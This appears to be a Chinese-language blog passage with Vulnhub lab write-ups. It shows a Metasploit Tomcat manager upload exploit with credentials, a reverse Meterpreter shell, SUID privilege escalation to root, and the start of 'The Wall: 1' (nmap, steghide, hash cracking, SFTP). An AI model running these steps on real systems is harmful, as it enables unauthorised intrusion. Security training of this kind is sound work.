<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~# searchsploit tomcat  <span class="p">|</span>  grep Upload
Apache Tomcat Manager - Application Upload Authenticated Code Execution                       <span class="p">|</span> ./multiple/remote/31433.rb
Apache Commons FileUpload and Apache Tomcat - Denial-of-Service                               <span class="p">|</span> ./multiple/dos/31615.rb</code></pre></div></p>

<p>第一個看起來有點像是我們想要東西，而要實際操作這個exploit必須要使用metasploit</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~# msfconsole -q
msf &gt; search tomcat
<span class="p">&amp;</span>hellip<span class="p">;</span>
exploit/multi/http/tomcat_mgr_upload                         2009-11-09       excellent  Apache Tomcat Manager Authenticated Upload Code Execution
msf &gt; use exploit/multi/http/tomcat_mgr_upload
msf exploit<span class="o">(</span>tomcat_mgr_upload<span class="o">)</span> &gt;</code></pre></div></p>

<p>設定好之後用show options檢查一下</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">PASSWORD   Gu3SSmYStR0NgPa<span class="nv">$sw0rD</span>!  no        The password <span class="k">for</span> the specified username
  Proxies                            no        A proxy chain of format <span class="nb">type</span>:host:port<span class="o">[</span>,type:host:port<span class="o">][</span><span class="p">&amp;</span>hellip<span class="p">;</span><span class="o">]</span>
  RHOST      127.0.0.1               yes       The target address
  RPORT      <span class="m">80</span>                      yes       The target port
  TARGETURI  /manager                yes       The URI path of the manager app <span class="o">(</span>/html/upload and /undeploy will be used<span class="o">)</span>
  USERNAME   sl33py                  no        The username to authenticate as
  VHOST                              no        HTTP server virtual host</code></pre></div></p>

<p>設定沒問題就給他run下去！成功拿到meterpreter的shell！</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">msf exploit<span class="o">(</span>tomcat_mgr_upload<span class="o">)</span> &gt; run&lt;/p&gt;

&lt;p&gt;<span class="o">[</span>&lt;em&gt;<span class="o">]</span> Started reverse handler on 192.168.0.115:12333
<span class="o">[</span>&lt;/em&gt;<span class="o">]</span> 127.0.0.2:80 - Retrieving session ID and CSRF token<span class="p">&amp;</span>hellip<span class="p">;</span>
<span class="o">[</span>&lt;em&gt;<span class="o">]</span> 127.0.0.2:80 - Uploading and deploying 9Vw90ot2DD7eS<span class="p">&amp;</span>hellip<span class="p">;</span>
<span class="o">[</span>&lt;/em&gt;<span class="o">]</span> 127.0.0.2:80 - Executing 9Vw90ot2DD7eS<span class="p">&amp;</span>hellip<span class="p">;</span>
<span class="o">[</span>&lt;em&gt;<span class="o">]</span> 127.0.0.2:80 - Undeploying 9Vw90ot2DD7eS <span class="p">&amp;</span>hellip<span class="p">;</span>
<span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Transmitting intermediate stager <span class="k">for</span> over-sized stage<span class="p">&amp;</span>hellip<span class="p">;</span><span class="o">(</span><span class="m">105</span> bytes<span class="o">)</span>
<span class="o">[</span>&lt;em&gt;<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">1495598</span> bytes<span class="o">)</span> to 192.168.0.117
<span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>192.168.0.115:12333 -&gt; 192.168.0.117:37622<span class="o">)</span> at 2015-12-21 00:25:56 +0800&lt;/p&gt;

&lt;p&gt;meterpreter &gt;</code></pre></div></p>

<p>稍微研究一下目標電腦，會知道裡面有個叫sleepy的使用者，而且有個能夠以tomcat身分執行的suid程式</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">sh-4.2<span class="nv">$ </span>cat /etc/passwd
<span class="p">&amp;</span>hellip<span class="p">;</span>
sleepy:x:1002:1002::/home/sleepy:/bin/bash
sh-4.2<span class="nv">$ </span><span class="k">for</span> i in <span class="k">$(</span>find / -perm -4000 2&gt;/dev/null<span class="k">)</span><span class="p">;</span> <span class="k">do</span> ls -al <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
<span class="p">&amp;</span>hellip<span class="p">;</span>
-rwsr-s<span class="p">&amp;</span>mdash<span class="p">;</span>. <span class="m">1</span> root tomcat <span class="m">8669</span> Jan <span class="m">18</span>  <span class="m">2015</span> /usr/bin/nightmare</code></pre></div></p>

<p>而實際執行後會跳出錯誤訊息</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">sh-4.2<span class="nv">$ </span>/usr/bin/nightmare
<span class="o">[</span>-<span class="o">]</span> error: no tty present</code></pre></div></p>

<p>要tty是吧，試試看能不能用pty<a href="http://stackoverflow.com/questions/1401002/trick-an-application-into-thinking-its-stdin-is-interactive-not-a-pipe">騙一下</a></p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">sh-4.2<span class="nv">$ </span>python -c <span class="p">&amp;</span>lsquo<span class="p">;</span>import pty<span class="p">;</span>pty.spawn<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>/bin/bash<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;&amp;</span>rsquo<span class="p">;</span>
bash-4.2<span class="nv">$ </span>/usr/bin/nightmare
/usr/bin/nightmare
Error opening terminal: unknown.
<span class="o">[</span>+<span class="o">]</span> Again <span class="o">[</span>y/n<span class="o">]</span>?</code></pre></div></p>

<p>看來不能用騙的，最後只好把程式丟回kali分析看看</p>

<p>程式的架構大概是像下面這樣</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">void main<span class="o">()</span>
<span class="o">{</span>
    memset<span class="o">(</span>var_a, 0x0, 0x98<span class="o">)</span><span class="p">;</span>
    sigaction<span class="o">(</span>0x2, 0x40081f, 0<span class="o">)</span><span class="p">;</span>
    sigaction<span class="o">(</span>0xf, 0x40081f, 0<span class="o">)</span><span class="p">;</span>
    <span class="k">if</span> <span class="o">(</span>open<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>/dev/tty<span class="p">&amp;</span>rdquo<span class="p">;</span>, 0x2<span class="o">)</span> <span class="o">==</span> -1<span class="o">)</span> <span class="o">{</span>
        puts <span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span><span class="o">[</span>-<span class="o">]</span> error: no tty present<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
    <span class="o">}</span>
    <span class="k">else</span> <span class="o">{</span>
        fire<span class="o">()</span><span class="p">;</span>
        <span class="k">while</span> <span class="o">(</span>1<span class="o">)</span> <span class="o">{</span>
            <span class="nb">printf</span> <span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span><span class="o">[</span>+<span class="o">]</span> Again <span class="o">[</span>y/n<span class="o">]</span>?<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
            <span class="nv">var_b</span> <span class="o">=</span> getchar <span class="o">()</span><span class="p">;</span>
            <span class="k">if</span> <span class="o">(</span><span class="nv">var_b</span> <span class="o">==</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>y<span class="p">&amp;</span>rsquo<span class="p">;</span> or <span class="nv">var_b</span> <span class="o">==</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>Y<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span> <span class="o">{</span>
                fire<span class="o">()</span><span class="p">;</span>
            <span class="o">}</span>
            <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="nv">var_b</span> <span class="o">==</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>n<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="o">||</span> <span class="nv">var_b</span> <span class="o">==</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>N<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span> <span class="o">{</span>
                puts <span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>Oops.. <span class="p">&amp;</span>lsquo<span class="p">;</span>n<span class="p">&amp;</span>rsquo<span class="p">;</span> is broken<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
            <span class="o">}</span>
        <span class="o">}</span><span class="p">;</span>
    <span class="o">}</span>
<span class="o">}</span>&lt;/p&gt;

&lt;p&gt;void fire <span class="o">()</span>
<span class="o">{</span>
    system<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>/usr/bin/aafire<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
<span class="o">}</span></code></pre></div></p>

<p>再來是sigaction所指定的函式</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">void sigHandler <span class="o">()</span>
<span class="o">{</span>
    train<span class="o">()</span><span class="p">;</span>
    <span class="nb">exit</span><span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
<span class="o">}</span>&lt;/p&gt;

&lt;p&gt;void train <span class="o">()</span>
<span class="o">{</span>
    setresuid <span class="o">(</span>0, 0, 0, 0<span class="o">)</span><span class="p">;</span>
    setresgid <span class="o">(</span>0, 0, 0, 0<span class="o">)</span><span class="p">;</span>
    system <span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>/usr/bin/sl -al<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
<span class="o">}</span></code></pre></div></p>

<p>既然用到了setresuid和setresgid，看來是希望我們對/usr/bin/sl操作來達到提權的目的</p>

<p>花了一段時間，最後用&#8221;replace path to binary&#8221;當關鍵字找到一個神奇的<a href="http://serverfault.com/questions/548320/override-path-to-binary-for-particular-user">解法</a></p>

<p>程式內用sigaction設定了當遇到SIGINT(0x2)和SIGTERM(0xf)時要進入sigHandler</p>

<p>不過因為現在是用meterpreter建的shell，如果下Ctrl+C的話，SIGINT指令會被meterpreter吃掉</p>

<p>只能再建另一個session，用kill -2或-15把signal送出後就拿到root了</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">bash-4.2<span class="nv">$ </span>/usr/bin/nightmare
/usr/bin/nightmare
Error opening terminal: unknown.
<span class="o">[</span>+<span class="o">]</span> Again <span class="o">[</span>y/n<span class="o">]</span>? bash-4.2# id
id
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,91<span class="o">(</span>tomcat<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:tomcat_t:s0
bash-4.2#</code></pre></div></p>

<p>/root/flag.txt是超佔畫面的的七個小矮人，就不放了</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The Wall: 1]]></title>
    <link href="http://newdominic.github.io/blog/2015/12/19/the_wall_1/"/>
    <updated>2015-12-19T17:57:45+08:00</updated>
    <id>http://newdominic.github.io/blog/2015/12/19/the_wall_1</id>
    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/the-wall-1,130/">The Wall 1</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>

<!--more-->


<hr />

<p>首先用nmap掃描目標ip，會發現完全沒有對外開放的por</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# nmap -n -p- -T5 192.168.0.116
<span class="p">&amp;</span>hellip<span class="p">;</span>
All <span class="m">65535</span> scanned ports on 192.168.0.116 are filtered</code></pre></div></p>

<p>找不到對外的開口，只好來看看目標有沒有對外發送甚麼訊息</p>

<p>開啟wireshark後針對目標ip設定filter</p>

<p><img class="center" src="/images/2015-12-19-thewall-1/1337.png"></p>

<p>發現每10秒左右會收到該目標要求跟攻擊端電腦的port 1337連線</p>

<p>就來監聽一下port 1337，看看對方送甚麼內容</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# nc -lp 1337&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;                   .u!<span class="s2">&quot;`</span>
<span class="s2">               .x*&quot;</span><span class="sb">`</span>
           ..+<span class="s2">&quot;NP</span>
<span class="s2">        .z&quot;&quot;   ?</span>
<span class="s2">      M#`      9     ,     ,</span>
<span class="s2">               9 M  d! ,8P&#39;</span>
<span class="s2">               R X.:x&#39; R&#39;  ,</span>
<span class="s2">               F F&#39; M  R.d&#39;</span>
<span class="s2">               d P  @  E`  ,</span>
<span class="s2">  ss           P  &#39;  P  N.d&#39;</span>
<span class="s2">   x         &#39;&#39;        &#39;</span>
<span class="s2">   X               x             .</span>
<span class="s2">   9     .f       !         .    $b</span>
<span class="s2">   4;    $k      /         dH    $f</span>
<span class="s2">   &#39;X   ;$$     z  .       MR   :$</span>
<span class="s2">    R   M$$,   :  d9b      M&#39;   tM</span>
<span class="s2">    M:  #&#39;$L  ;&#39; M `8      X    MR</span>
<span class="s2">    `$;t&#39; $F  # X ,oR      t    Q;</span>
<span class="s2">     $$@  R$ H :RP&#39; $b     X    @&#39;</span>
<span class="s2">     9$E  @Bd&#39; $&#39;   ?X     ;    W</span>
<span class="s2">     `M&#39;  `$M d$    `E    ;.o* :R   ..</span>
<span class="s2">      `    &#39;  &quot;</span><span class="s1">&#39;     &#39;</span>    @<span class="s1">&#39;   &#39;</span><span class="nv">$o</span>*<span class="err">&quot;&#39;</span>

          The Wall by @xerubus
      -<span class="o">=</span> Welcome to the <span class="nv">Machine</span> <span class="o">=</span>-
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If you should go skating on the thin ice of modern life, dragging behind you the
silent reproach of a million tear-stained eyes, don<span class="p">&amp;</span>rsquo<span class="p">;</span>t be surprised when a crack
in the ice appears under your feet. - Pink Floyd, The Thin Ice</code></pre></div></p>

<p>收到一條歡迎訊息，看起來只是Pink Floyd的歌詞&hellip;</p>

<p>在不知道該做甚麼的情況下只好再掃一次nmap，看看接收訊息後有沒有觸發甚麼開關</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# nmap -n -sT 192.168.0.116 -p-&lt;/p&gt;

&lt;p&gt;Starting Nmap 6.49BETA4 <span class="o">(</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://nmap.org&quot;</span>&gt;https://nmap.org&lt;/a&gt; <span class="o">)</span> at 2015-12-19 18:15 CST
Nmap scan report <span class="k">for</span> 192.168.0.116
Host is up <span class="o">(</span>0.0048s latency<span class="o">)</span>.
Not shown: <span class="m">65534</span> filtered ports
PORT   STATE SERVICE
80/tcp open  http
1965/tcp open  unknown
MAC Address: AC:BC:32:80:89:77 <span class="o">(</span>Unknown<span class="o">)</span>&lt;/p&gt;

&lt;p&gt;Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 112.28 seconds</code></pre></div></p>

<p>有兩個port被打開了！</p>

<p>port 80有開，先用瀏覽器看一下</p>

<p><img class="center" src="/images/2015-12-19-thewall-1/pink_floyd.png"></p>

<p>首頁只是一張Pink Floyd的合照，不過檢視原始碼之後會看到一段備註跟一串數字</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;/p&gt;

&lt;!--If you want to find out what<span class="s1">&#39;s behind these cold eyes, you&#39;</span>ll just have to claw your way through this disguise. - Pink Floyd, The Wall

Did you know? The Publius Enigma is a mystery surrounding the Division Bell album.  Publius promised an unspecified reward <span class="k">for</span> solving the
riddle, and further claimed that there was an enigma hidden within the artwork.

737465673d3333313135373330646262623337306663626539373230666536333265633035--&gt;


&lt;p&gt;</code></pre></div></p>

<p>備註看起來是有密碼藏在圖片裡的意思</p>

<p>拿kali, stegano, password去google之後，會找到一個叫做steghide的工具</p>

<p>steghide可以將檔案藏入圖片中，並且設置密碼保護</p>

<p>備註的那串數字應該就是要用的密碼了</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# steghide extract -sf pink_floyd.jpg
Enter passphrase:
steghide: could not extract any data with that passphrase!</code></pre></div></p>

<p>結果不能直接輸入數字當密碼，只好把他轉成hex試試看</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# python -c <span class="p">&amp;</span>lsquo<span class="p">;</span>print <span class="p">&amp;</span>ldquo<span class="p">;</span>737465673d3333313135373330646262623337306663626539373230666536333265633035<span class="p">&amp;</span>rdquo<span class="p">;</span>.decode<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>hex<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;&amp;</span>rsquo<span class="p">;</span>
<span class="nv">steg</span><span class="o">=</span>33115730dbbb370fcbe9720fe632ec05</code></pre></div></p>

<p>轉出來的字串看起來有意義了，但是在拿後面那串16進位的字串當密碼還是失敗</p>

<p>最後看他符合md5的格式，就直接丟去google，馬上就得到答案：divisionbell</p>

<p><img class="center" src="/images/2015-12-19-thewall-1/md5.png"></p>

<p>輸入密碼後就會解出一個txt檔，內容看起來又是要解另兩組編碼</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# steghide extract -sf pink_floyd.jpg
Enter passphrase:
wrote extracted data to <span class="p">&amp;</span>ldquo<span class="p">;</span>pink_floyd_syd.txt<span class="p">&amp;</span>rdquo<span class="p">;</span>.
root@kali:~/Security/wall# cat pink_floyd_syd.txt
Hey Syd,&lt;/p&gt;

&lt;p&gt;I hear you<span class="p">&amp;</span>rsquo<span class="p">;</span>re full of dust and guitars?&lt;/p&gt;

&lt;p&gt;If you want to See Emily Play, just use this key: <span class="nv">U3lkQmFycmV0dA</span><span class="o">==</span><span class="p">|</span>f831605ae34c2399d1e5bb3a4ab245d0&lt;/p&gt;

&lt;p&gt;Roger&lt;/p&gt;

&lt;p&gt;Did you know? In 1965, The Pink Floyd Sound changed their name to Pink Floyd.  The name was inspired
by Pink Anderson and Floyd Council, two blues muscians on the Piedmont Blues record Syd Barret had in
his collection.</code></pre></div></p>

<p>前半段用base64解碼後得到：SydBarrett</p>

<p>後半段再拿去google搜尋md5得到：pinkfloydrocks</p>

<p>解完這兩組key之後，也沒有後續的線索了</p>

<p>再來試一下剛剛namp掃到的port 1965，嘗試用ssh連線看看</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# nc 192.168.0.116 1965
SSH-2.0-OpenSSH_7.0</code></pre></div></p>

<p>拿剛剛得到的兩組字串當帳密去試試看</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# ssh &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#97;&amp;#105;&amp;#x6c;&amp;#x74;&amp;#x6f;&amp;#58;&amp;#x53;&amp;#x79;&amp;#x64;&amp;#x42;&amp;#x61;&amp;#114;&amp;#x72;&amp;#x65;&amp;#x74;&amp;#x74;&amp;#x40;&amp;#49;&amp;#57;&amp;#50;&amp;#x2e;&amp;#x31;&amp;#54;&amp;#56;&amp;#46;&amp;#48;&amp;#46;&amp;#x31;&amp;#49;&amp;#x36;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x53;&amp;#x79;&amp;#x64;&amp;#x42;&amp;#x61;&amp;#x72;&amp;#114;&amp;#101;&amp;#116;&amp;#116;&amp;#64;&amp;#x31;&amp;#x39;&amp;#x32;&amp;#46;&amp;#49;&amp;#54;&amp;#x38;&amp;#46;&amp;#48;&amp;#x2e;&amp;#49;&amp;#49;&amp;#54;&lt;/a&gt; -p 1965</span>
The authenticity of host <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="o">[</span>192.168.0.116<span class="o">]</span>:1965 <span class="o">([</span>192.168.0.116<span class="o">]</span>:1965<span class="o">)</span><span class="p">&amp;</span>rsquo<span class="p">;</span> can<span class="p">&amp;</span>rsquo<span class="p">;</span>t be established.
ECDSA key fingerprint is 6c:2b:d1:2c:4f:1c:b5:7a:1b:1e:e9:4b:8e:9b:4b:5a.
Are you sure you want to <span class="k">continue</span> connecting <span class="o">(</span>yes/no<span class="o">)</span>? yes
Warning: Permanently added <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="o">[</span>192.168.0.116<span class="o">]</span>:1965<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="o">(</span>ECDSA<span class="o">)</span> to the list of known hosts.
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#108;&amp;#x74;&amp;#x6f;&amp;#58;&amp;#83;&amp;#121;&amp;#x64;&amp;#66;&amp;#x61;&amp;#114;&amp;#x72;&amp;#x65;&amp;#x74;&amp;#116;&amp;#x40;&amp;#49;&amp;#57;&amp;#x32;&amp;#x2e;&amp;#49;&amp;#54;&amp;#x38;&amp;#x2e;&amp;#48;&amp;#x2e;&amp;#49;&amp;#49;&amp;#54;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x53;&amp;#x79;&amp;#x64;&amp;#66;&amp;#97;&amp;#114;&amp;#x72;&amp;#x65;&amp;#x74;&amp;#x74;&amp;#64;&amp;#x31;&amp;#57;&amp;#x32;&amp;#x2e;&amp;#x31;&amp;#54;&amp;#56;&amp;#46;&amp;#x30;&amp;#46;&amp;#x31;&amp;#49;&amp;#54;&lt;/a&gt;&amp;rsquo;s password:</span>
Could not chdir to home directory /home/SydBarrett: No such file or directory
This service allows sftp connections only.
Connection to 192.168.0.116 closed.</code></pre></div></p>

<p>結果被系統打槍，只好照他說的用sftp登入，接著把裡面的東西通通抓回來研究</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# sftp -P1965 &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#97;&amp;#105;&amp;#108;&amp;#116;&amp;#111;&amp;#58;&amp;#83;&amp;#x79;&amp;#100;&amp;#66;&amp;#x61;&amp;#x72;&amp;#114;&amp;#x65;&amp;#116;&amp;#x74;&amp;#64;&amp;#49;&amp;#x39;&amp;#x32;&amp;#46;&amp;#x31;&amp;#x36;&amp;#x38;&amp;#46;&amp;#48;&amp;#46;&amp;#x31;&amp;#x31;&amp;#x36;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#83;&amp;#x79;&amp;#100;&amp;#x42;&amp;#97;&amp;#114;&amp;#114;&amp;#101;&amp;#116;&amp;#x74;&amp;#64;&amp;#x31;&amp;#x39;&amp;#50;&amp;#46;&amp;#x31;&amp;#54;&amp;#x38;&amp;#46;&amp;#x30;&amp;#46;&amp;#x31;&amp;#49;&amp;#x36;&lt;/a&gt;</span>
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#108;&amp;#116;&amp;#111;&amp;#58;&amp;#83;&amp;#x79;&amp;#x64;&amp;#66;&amp;#97;&amp;#114;&amp;#114;&amp;#101;&amp;#x74;&amp;#116;&amp;#64;&amp;#49;&amp;#57;&amp;#x32;&amp;#x2e;&amp;#x31;&amp;#x36;&amp;#x38;&amp;#46;&amp;#48;&amp;#x2e;&amp;#x31;&amp;#49;&amp;#x36;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#83;&amp;#x79;&amp;#100;&amp;#66;&amp;#97;&amp;#114;&amp;#114;&amp;#x65;&amp;#x74;&amp;#x74;&amp;#x40;&amp;#49;&amp;#57;&amp;#x32;&amp;#46;&amp;#49;&amp;#x36;&amp;#56;&amp;#x2e;&amp;#48;&amp;#46;&amp;#x31;&amp;#x31;&amp;#x36;&lt;/a&gt;&amp;rsquo;s password:</span>
Connected to 192.168.0.116.
sftp&gt; sl
Invalid command.
sftp&gt; ls -al
drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span>    <span class="m">3</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">512</span> Oct <span class="m">24</span> 20:16 .
drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span>    <span class="m">3</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">512</span> Oct <span class="m">24</span> 20:16 ..
drwxr-xr-x    <span class="m">3</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">512</span> Oct <span class="m">24</span> 18:17 .mail
-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>    <span class="m">1</span> <span class="m">0</span>        <span class="m">1000</span>         <span class="m">1912</span> Oct <span class="m">25</span> 22:56 bio.txt
-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>    <span class="m">1</span> <span class="m">0</span>        <span class="m">1000</span>       <span class="m">868967</span> Oct <span class="m">24</span> 16:17 syd_barrett_profile_pic.jpg
sftp&gt; get bio.txt
Fetching /bio.txt to bio.txt
/bio.txt                                                                100% <span class="m">1912</span>     1.9KB/s   00:00
sftp&gt; get syd_barrett_profile_pic.jpg
Fetching /syd_barrett_profile_pic.jpg to syd_barrett_profile_pic.jpg
/syd_barrett_profile_pic.jpg                                            100%  849KB 848.6KB/s   00:00
sftp&gt; <span class="nb">cd</span> .mail
sftp&gt; ls
sent-items
sftp&gt; ls -al
drwxr-xr-x    <span class="m">3</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">512</span> Oct <span class="m">24</span> 18:17 .
drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span>    <span class="m">3</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">512</span> Oct <span class="m">24</span> 20:16 ..
drwxr-xr-x    <span class="m">2</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">512</span> Nov <span class="m">11</span> 10:25 .stash
-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>    <span class="m">1</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">309</span> Oct <span class="m">24</span> 18:18 sent-items
sftp&gt; get sent-items
Fetching /.mail/sent-items to sent-items
/.mail/sent-items                                                       100%  <span class="m">309</span>     0.3KB/s   00:00
sftp&gt; <span class="nb">cd</span> .
../      ./       .stash/
sftp&gt; <span class="nb">cd</span> .stash/
sftp&gt; ls
eclipsed_by_the_moon
sftp&gt; ls -al
drwxr-xr-x    <span class="m">2</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">512</span> Nov <span class="m">11</span> 10:25 .
drwxr-xr-x    <span class="m">3</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">512</span> Oct <span class="m">24</span> 18:17 ..
-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>    <span class="m">1</span> <span class="m">0</span>        <span class="m">1000</span>     <span class="m">48884479</span> Aug  <span class="m">7</span> 14:33 eclipsed_by_the_moon
sftp&gt; get eclipsed_by_the_moon
Fetching /.mail/.stash/eclipsed_by_the_moon to eclipsed_by_the_moon
/.mail/.stash/eclipsed_by_the_moon                                      100%   47MB   5.8MB/s   00:00
sftp&gt;</code></pre></div></p>

<p>看來看去最可疑的是sent-items的內容和eclipsed_by_the_moon</p>

<p>說找到後用scalpel處理??</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# cat sent-items
Date: Sun, <span class="m">24</span> Oct <span class="m">1965</span> 18:45:21 +0200
From: Syd Barrett &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#x6c;&amp;#x74;&amp;#111;&amp;#58;&amp;#115;&amp;#121;&amp;#100;&amp;#64;&amp;#x70;&amp;#x69;&amp;#x6e;&amp;#x6b;&amp;#46;&amp;#102;&amp;#108;&amp;#x6f;&amp;#x79;&amp;#x64;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x73;&amp;#x79;&amp;#100;&amp;#x40;&amp;#x70;&amp;#105;&amp;#110;&amp;#107;&amp;#x2e;&amp;#102;&amp;#108;&amp;#x6f;&amp;#121;&amp;#x64;&lt;/a&gt;</span>
Reply-To: Syd Barret &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#108;&amp;#116;&amp;#111;&amp;#58;&amp;#115;&amp;#121;&amp;#x64;&amp;#64;&amp;#x70;&amp;#105;&amp;#x6e;&amp;#x6b;&amp;#x2e;&amp;#x66;&amp;#x6c;&amp;#x6f;&amp;#x79;&amp;#100;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#115;&amp;#x79;&amp;#100;&amp;#x40;&amp;#112;&amp;#105;&amp;#110;&amp;#x6b;&amp;#x2e;&amp;#102;&amp;#x6c;&amp;#111;&amp;#x79;&amp;#x64;&lt;/a&gt;</span>
To: Roger Waters &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#x69;&amp;#x6c;&amp;#x74;&amp;#111;&amp;#58;&amp;#114;&amp;#x6f;&amp;#103;&amp;#x65;&amp;#114;&amp;#64;&amp;#x70;&amp;#105;&amp;#x6e;&amp;#107;&amp;#x2e;&amp;#102;&amp;#108;&amp;#x6f;&amp;#121;&amp;#100;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#114;&amp;#x6f;&amp;#x67;&amp;#x65;&amp;#x72;&amp;#x40;&amp;#112;&amp;#x69;&amp;#110;&amp;#x6b;&amp;#46;&amp;#x66;&amp;#108;&amp;#x6f;&amp;#121;&amp;#100;&lt;/a&gt;</span>
Subject: Had to hide the stash&lt;/p&gt;

&lt;p&gt;Roger<span class="p">&amp;</span>hellip<span class="p">;</span> I had to hide the stash.&lt;/p&gt;

&lt;p&gt;Usual deal.. just use the scalpel when you find it.&lt;/p&gt;

&lt;p&gt;Ok, sorry <span class="k">for</span> that.&lt;/p&gt;

&lt;p&gt;Rock on man&lt;/p&gt;

